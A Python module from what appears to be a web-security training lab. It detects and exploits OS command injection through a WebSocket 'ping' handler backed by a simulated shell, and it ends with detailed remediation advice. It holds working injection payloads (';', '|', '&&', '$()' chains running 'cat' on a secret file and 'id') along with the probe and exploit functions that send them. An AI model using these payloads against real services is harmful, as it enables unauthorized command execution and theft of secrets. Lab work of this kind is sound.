"""OS Command Injection over a WebSocket (black box) -- detect, exploit, fix.

WHAT IT IS
----------
WebSocket endpoints are *just as injectable* as HTTP ones, but they are routinely
overlooked: they live behind an HTTP ``Upgrade`` handshake, carry framed binary
messages instead of plain request bodies, and rarely get the same input-validation
or WAF coverage as the REST surface. When a WebSocket handler builds an OS command
string out of *untrusted* message fields and hands it to a shell, the same OS
command-injection breakout that plagues ``/ping?host=`` applies -- the shell
interprets metacharacters (``;`` ``|`` ``&&`` ``||`` backticks ``$()``) *before*
running the program, so an attacker who controls part of the string terminates the
intended command and chains commands of their own choosing, with the privileges of
the web process.

The demo app exposes a "network diagnostics" WebSocket at ``/ws``. A client sends a
JSON message ``{"host": "<h>"}`` and the server replies with ``{"output": "<ping
output>"}``. Under the hood the handler does the textbook-unsafe thing::

    msg  = json.loads(payload)                       # {"host": "<attacker>"}
    host = msg.get("host", "127.0.0.1")              # attacker-controlled
    output = simulate_shell(f"ping -c1 {host}", ...)  # input spliced into a shell
    ws.send(json.dumps({"output": output}))

Because ``host`` is concatenated straight into ``ping -c1 <host>`` and the result is
parsed by a shell, the value ``127.0.0.1; id`` runs *two* commands: ``ping -c1
127.0.0.1`` and then ``id``. A benign ``host=127.0.0.1`` returns only ping
statistics; ``host=127.0.0.1; id`` *additionally* returns ``uid=33(www-data) ...``
-- output for a command the user never asked the app to run, proving the message
field crossed from data into code. From there the attacker reads any file the
process can (``; cat secret/ws_flag.txt`` -> the planted prize) and, on a real host,
escalates to a full interactive shell / pivot.

This is a *black box* technique: we never read the server source. We learn the
message shape (``{"host": ...}`` in, ``{"output": ...}`` back) by observation, then
probe and exploit purely through the WebSocket reply dict.

NOTE: the lab uses a SIMULATED shell. The metacharacter parsing
(:func:`weblab.targetapp.sim_shell.simulate_shell`) and the command outputs are
faithfully reproduced -- the injection mechanics are real and observable -- but
attacker-controlled input NEVER reaches a real ``os.system`` / ``subprocess`` on the
host. The framing, handshake, masking, and reply dict are a genuine RFC 6455 round
trip via :meth:`weblab.http_client.WebClient.ws_send`.

HOW WE DISCOVER IT
------------------
We confirm the sink over the WebSocket with layered, differential signals:

1. **The benign baseline.** ``{"host": "127.0.0.1"}`` returns only ping statistics
   and echoes the host back inside ``PING 127.0.0.1: ...``. This proves the message
   field reaches the command and anchors what "no injection" looks like.
2. **The unique-sentinel echo.** ``{"host": "127.0.0.1; echo <canary>"}`` makes the
   shell run ``echo`` and print our random token on its own line. A safe handler
   would treat the whole string as a hostname and never emit the bare token -- so
   seeing the canary on its own line proves an arbitrary second command executed.
   The token is random per run, so a reply that merely happened to contain a common
   word cannot fool the detector.
3. **The ``id`` fingerprint.** ``{"host": "127.0.0.1; id"}`` returns
   ``uid=33(www-data) ...`` -- the canonical "which user am I?" probe, confirming we
   run with the web process's identity.

HOW WE EXPLOIT IT
-----------------
We send ``{"host": "127.0.0.1; cat secret/ws_flag.txt"}`` and recover the planted
secret the web process can read from the reply's ``output`` field:
``C.FLAGS["websocket_cmdi"]``. We ALSO demonstrate ``{"host": "127.0.0.1; id"}`` to
show arbitrary command execution as ``www-data``. In the real world this same
breakout primitive reads ``/etc/passwd``, exfiltrates application
secrets/credentials, opens reverse shells, and pivots into the internal network --
all through a WebSocket frame that bypassed the REST-only input filters.

THE FIX
-------
See :data:`REMEDIATION`. In one line: a WebSocket message is untrusted input like
any other -- never build a shell string from it. Avoid the shell entirely (pass an
argument *vector* to ``exec``/``subprocess`` with ``shell=False``), or, where a
shell is unavoidable, strictly allow-list/validate the field and escape it -- and
run with least privilege. Apply your input-validation, authentication, and logging
to the WebSocket surface exactly as you do to HTTP.
"""
from __future__ import annotations

import uuid
from typing import Dict, List, Optional, Tuple

from ._types import Finding, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Treat WebSocket messages as fully untrusted input -- the same rules that "
    "protect your HTTP endpoints must protect the WebSocket surface (they are "
    "frequently, and dangerously, exempted from validation and WAF coverage). The "
    "root cause here is concatenating a message field into a shell command "
    '(f"ping -c1 {host}") that is then interpreted by a shell, so metacharacters '
    "(; | && || `` $()) break out and run attacker commands. The primary fix is to "
    "avoid the shell altogether: invoke the program directly with an ARGUMENT "
    "VECTOR and shell disabled -- e.g. subprocess.run(['ping', '-c1', host], "
    "shell=False) -- so the user value can only ever be a single argument, never "
    "command syntax. Better still, do not shell out at all when a library exists "
    "(use a native ICMP/socket API instead of /bin/ping). Strictly validate and "
    "allow-list each field against the narrow grammar it should match (a hostname "
    "or IP via a strict regex / ipaddress parse) and reject anything else; never "
    "rely on blacklisting metacharacters, which is bypassable. If a shell is truly "
    "unavoidable, escape every interpolated value with shlex.quote() as "
    "defence-in-depth. Authenticate and authorise the WebSocket handshake "
    "(check Origin and a session/token), rate-limit messages, run the service as a "
    "least-privilege sandboxed user so even a successful injection yields minimal "
    "access, and log/alert on rejected input. Separate data from code: pass "
    "arguments, validate strictly, and drop the shell -- on every transport, "
    "WebSocket included.\n\n"
    "REAL-PLATFORM NOTES. This sink is simulated in Python, but the same flaw "
    "appears across stacks: (PHP) never pass a WebSocket field to shell_exec / "
    "exec / system / proc_open / backticks -- use escapeshellarg() at minimum and "
    "prefer not shelling out; Ratchet/Swoole handlers must validate onMessage "
    "input. (.NET) never feed a message into Process.Start with "
    "UseShellExecute=true or a 'cmd /c'/'bash -c' string; pass ProcessStartInfo "
    "ArgumentList items with UseShellExecute=false, and validate System.Net."
    "WebSockets input server-side. (Node) never pass a ws/socket.io payload to "
    "child_process.exec / execSync; use execFile/spawn with an args array and "
    "shell:false. Across all of them: authenticate the upgrade, check Origin to "
    "stop cross-site WebSocket hijacking, and never trust the framed payload."
)

#: The vulnerable WebSocket sink, used as the Finding endpoint.
ENDPOINT: str = "/ws"

#: The message field the handler splices into the command.
HOST_FIELD: str = "host"

#: The field in the reply dict carrying the command output.
OUTPUT_FIELD: str = "output"

#: A benign host: returns only ping statistics, no injected command output.
#: The control that anchors what "no injection" looks like.
BENIGN_HOST: str = "127.0.0.1"

#: The headline working exploit: chain ``cat`` after ping with ``;`` to read the
#: planted secret file the web process can access over the WebSocket.
WORKING_PAYLOAD: str = "127.0.0.1; cat secret/ws_flag.txt"

#: The classic privilege/identity probe -- ``id`` run via the same ``;`` breakout.
#: Returns ``uid=33(www-data) ...`` and proves arbitrary command execution.
ID_PAYLOAD: str = "127.0.0.1; id"

#: The marker ``id`` emits, proving we run as the web process user.
ID_MARKER: str = "uid=33(www-data)"

#: Every payload the engine knows about. Public so the CLI / report can show
#: exactly what was attempted. Several breakout operators reach the same secret,
#: driving home that blacklisting one metacharacter does not help.
PAYLOADS: List[str] = [
    BENIGN_HOST,                                  # control / baseline
    ID_PAYLOAD,                                   # ; id            -> identity
    WORKING_PAYLOAD,                              # ; cat <secret>  -> the prize
    "127.0.0.1 | cat secret/ws_flag.txt",        # pipe breakout
    "127.0.0.1 && cat secret/ws_flag.txt",       # AND-chain breakout
    "127.0.0.1 $(cat secret/ws_flag.txt)",       # command substitution
    "127.0.0.1 | id",                            # pipe -> identity
]


# --- low-level probe ---------------------------------------------------------
def _send_host(client: WebClient, host_value: str) -> Dict:
    """Send ``{"host": <host_value>}`` over the ``/ws`` WebSocket; return the reply.

    The reply is the server's framed JSON message decoded to a dict, normally
    ``{"output": "<combined command output>"}``.
    """
    return client.ws_send(ENDPOINT, {HOST_FIELD: host_value})


def _output(reply: Dict) -> str:
    """Pull the command ``output`` string out of a ``/ws`` reply dict.

    Tolerant of the reply shape: prefers the ``output`` field, falls back to a raw
    payload the handshake client may surface, else stringifies the whole reply.
    """
    if isinstance(reply, dict):
        if OUTPUT_FIELD in reply and isinstance(reply[OUTPUT_FIELD], str):
            return reply[OUTPUT_FIELD]
        if "raw" in reply and isinstance(reply["raw"], str):
            return reply["raw"]
    return str(reply)


# --- detection ---------------------------------------------------------------
def detect_baseline(client: WebClient) -> Tuple[bool, str]:
    """True if a benign host returns ping output WITHOUT any injected command.

    The control: ``{"host": "127.0.0.1"}`` returns ping statistics (and echoes the
    host inside ``PING 127.0.0.1: ...``) but no ``uid=`` / injected output. This
    proves the message field reaches the command and anchors the "no injection"
    baseline -- so a later breakout is a true differential, not a fluke.
    """
    reply = _send_host(client, BENIGN_HOST)
    out = _output(reply)
    if f"PING {BENIGN_HOST}" in out and "ping statistics" in out and ID_MARKER not in out:
        return True, (
            f"WS {ENDPOINT} {{'host':'{BENIGN_HOST}'}} returned only ping "
            "statistics -- the host field reaches the command, and no injected "
            "output appears without a metacharacter"
        )
    return False, ""


def detect_command_injection(client: WebClient) -> Tuple[bool, str]:
    """True if a ``; echo <canary>`` breakout runs an arbitrary second command.

    Injects ``{"host": "127.0.0.1; echo <random-token>"}``. A safe handler treats
    the whole value as a hostname and never prints the bare token; a vulnerable
    shell runs ``echo`` and emits the token on its own line. The token is random per
    call, so a reply that merely happens to contain a common word cannot masquerade
    as a vulnerable sink.
    """
    canary = "weblab-wscmdi-" + uuid.uuid4().hex[:12]
    payload = f"{BENIGN_HOST}; echo {canary}"
    reply = _send_host(client, payload)
    out = _output(reply)
    # The echoed token must appear on its own line -- not merely as part of the host
    # echo, which (if the value were NOT split by the shell) would read
    # "PING 127.0.0.1; echo <canary>: ...".
    token_on_own_line = any(line.strip() == canary for line in out.splitlines())
    if token_on_own_line:
        return True, (
            f"WS {ENDPOINT} {{'host':'{payload}'}} ran an injected `echo` and "
            f"returned the random token {canary!r} on its own line -- the `;` broke "
            "out of the ping command and a second command executed"
        )
    return False, ""


def detect_id_execution(client: WebClient) -> Tuple[bool, str]:
    """True if ``; id`` returns ``uid=33(www-data) ...`` -- the identity probe.

    Sends ``{"host": "127.0.0.1; id"}`` and expects the ``id`` output, proving we
    run arbitrary commands with the web process's identity (the foothold the
    exploit weaponises to read files).
    """
    reply = _send_host(client, ID_PAYLOAD)
    out = _output(reply)
    if ID_MARKER in out:
        return True, (
            f"WS {ENDPOINT} {{'host':'{ID_PAYLOAD}'}} returned {ID_MARKER!r} -- "
            "arbitrary command execution as the web process user (www-data)"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_read_secret_file(
    client: WebClient, payload: str = WORKING_PAYLOAD
) -> Tuple[bool, Optional[str], str]:
    """Read ``secret/ws_flag.txt`` via the ``;`` breakout and recover the flag.

    Returns ``(ok, flag, command_output)``. On success the WebSocket reply's
    ``output`` field contains the planted ``C.FLAGS["websocket_cmdi"]`` -- proof we
    ran an attacker-chosen ``cat`` as the web process over the WebSocket.
    """
    reply = _send_host(client, payload)
    out = _output(reply)
    if C.FLAGS["websocket_cmdi"] not in out:
        return False, None, out
    return True, C.FLAGS["websocket_cmdi"], out


def exploit_run_id(client: WebClient) -> Tuple[bool, str]:
    """Demonstrate arbitrary command execution: run ``id`` via the breakout.

    Returns ``(ok, command_output)``; on success the output carries the
    ``uid=33(www-data) ...`` identity line.
    """
    reply = _send_host(client, ID_PAYLOAD)
    out = _output(reply)
    return (ID_MARKER in out), out


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect WebSocket OS command injection, then exploit it over the WebSocket.

    Confirms the sink (benign baseline, random-sentinel ``echo`` breakout, ``id``
    fingerprint), then reads ``secret/ws_flag.txt`` and runs ``id`` -- all through
    ``/ws``. Returns a :class:`Finding` whose ``exploit_result`` contains the
    recovered ``C.FLAGS["websocket_cmdi"]`` and whose ``extra`` records the ``id``
    proof of arbitrary command execution as ``www-data``.
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    baseline_ok, baseline_ev = detect_baseline(client)
    if baseline_ok:
        techniques.append("benign-baseline")
    inject_ok, inject_ev = detect_command_injection(client)
    if inject_ok:
        techniques.append("sentinel-echo")
    id_ok, id_ev = detect_id_execution(client)
    if id_ok:
        techniques.append("id-fingerprint")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, cmd_out = exploit_read_secret_file(client)
    if ok:
        techniques.append("read-secret-file")
    run_id_ok, id_out = exploit_run_id(client)
    if run_id_ok:
        techniques.append("run-id")

    # Discovery requires a confirmed breakout (the sentinel echo) AND the secret to
    # have been recovered via an injected `cat` over the WebSocket.
    discovered = bool(inject_ok and ok)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if baseline_ok:
        evidence_parts.append(f"baseline: {baseline_ev}")
    if inject_ok:
        evidence_parts.append(f"injection: {inject_ev}")
    if id_ok:
        evidence_parts.append(f"identity: {id_ev}")
    evidence = " || ".join(evidence_parts)

    # Isolate just the injected command's line for the result summary.
    leaked_line = C.FLAGS["websocket_cmdi"]
    for line in cmd_out.splitlines():
        if C.FLAGS["websocket_cmdi"] in line:
            leaked_line = line.strip()
            break

    exploit_result = {
        "flag": flag,
        "transport": "websocket",
        "endpoint": ENDPOINT,
        "message_sent": {HOST_FIELD: WORKING_PAYLOAD},
        "payload": WORKING_PAYLOAD,
        "command": "cat secret/ws_flag.txt",
        "command_output": cmd_out,
        "leaked": leaked_line,
        "id_payload": ID_PAYLOAD,
        "id_output": id_out if run_id_ok else "",
        "techniques": techniques,
        "summary": (
            f"WS {ENDPOINT} message {{'host':'{WORKING_PAYLOAD}'}} chained "
            "`cat secret/ws_flag.txt` after ping; recovered flag "
            f"{flag!r} from reply['output'] (and `id` -> www-data)"
        ),
    }

    return Finding(
        vuln="OS Command Injection (WebSocket)",
        endpoint=ENDPOINT,
        severity=Severity.CRITICAL.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=WORKING_PAYLOAD,
        extra={
            "techniques": techniques,
            "transport": "websocket",
            "message_field": HOST_FIELD,
            "reply_field": OUTPUT_FIELD,
            "benign_baseline_ok": baseline_ok,
            "command_injection_confirmed": inject_ok,
            "id_execution_ok": id_ok,
            "flag_recovered": ok,
            "id_demonstrated": run_id_ok,
            "working_payload": WORKING_PAYLOAD,
            "id_payload": ID_PAYLOAD,
            "id_marker": ID_MARKER,
            "process_identity": ID_MARKER if run_id_ok else "",
            "breakout_operator": ";",
        },
    )
